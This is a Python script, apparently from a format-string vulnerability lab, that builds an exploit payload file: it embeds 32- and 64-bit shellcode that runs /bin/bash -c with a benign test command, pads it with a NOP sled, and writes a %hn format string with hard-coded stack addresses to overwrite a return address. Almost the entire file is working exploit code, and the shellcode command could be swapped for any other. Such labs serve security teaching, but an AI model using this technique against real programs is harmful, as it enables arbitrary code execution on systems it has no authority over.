#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))


# Choose the shellcode version based on your target
shellcode = shellcode_32
# shellcode= (
#    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
#    "\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
# ).encode('latin-1')

# Put the shellcode somewhere in the payload
start = 256               # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################
#
#    Construct the format string here
# Create the input

returnAddress = 0xffffd5f8+4

number = returnAddress 
content[0:4]  =  (number).to_bytes(4,byteorder='little')

number  = returnAddress + 2
content[4:8]  =  (number).to_bytes(4,byteorder='little')

newReturnAddress = 0xffffd6d0 + 128 # 0xffffd830
s = f"%{(newReturnAddress^0xffff0000) - 8}x%65$hn%{0xffff - (newReturnAddress^0xffff0000)}x%64$hn"

# s = "%8x"*62 + f"%{(ret^0xffff0000 )- 12 - 8*62}x" + "%hn" + f"%{0xffff - (ret^0xffff0000)}x"+ "%hn" 

# s = "%64$x%65$x"
print(s)
# s = ""
# for i in range(216):
#    s += f"{hex(0xffffd3f4 + i*4)}:  %8x\n"
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt
# 
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
